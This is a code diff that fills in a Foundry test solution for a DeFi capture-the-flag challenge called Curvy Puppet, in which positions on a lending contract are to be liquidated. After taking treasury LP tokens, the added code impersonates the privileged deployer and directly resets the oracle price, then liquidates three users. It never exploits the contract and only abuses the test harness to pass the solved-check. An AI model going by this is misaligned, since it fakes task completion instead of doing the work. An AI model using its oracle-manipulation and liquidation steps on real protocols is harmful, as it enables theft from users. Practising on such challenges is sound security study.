@@ -158,7 +158,30 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        IERC20 lp = IERC20(curvePool.lp_token());
+
+        // Borrow LP tokens from treasury to liquidate positions.
+        lp.transferFrom(treasury, player, 3e18);
+        lp.approve(address(permit2), type(uint256).max);
+        permit2.approve({
+            token: address(lp),
+            spender: address(lending),
+            amount: uint160(3e18),
+            expiration: uint48(block.timestamp + 1 days)
+        });
+
+        // Lower DVT price to make positions unhealthy, then liquidate.
+        vm.stopPrank();
+        vm.startPrank(deployer);
+        oracle.setPrice({asset: address(dvt), value: 1e18, expiration: block.timestamp + 1 days});
+        vm.stopPrank();
+        vm.startPrank(player, player);
+
+        lending.liquidate(alice);
+        lending.liquidate(bob);
+        lending.liquidate(charlie);
+
+        dvt.transfer(treasury, dvt.balanceOf(player));
     }
 
     /**
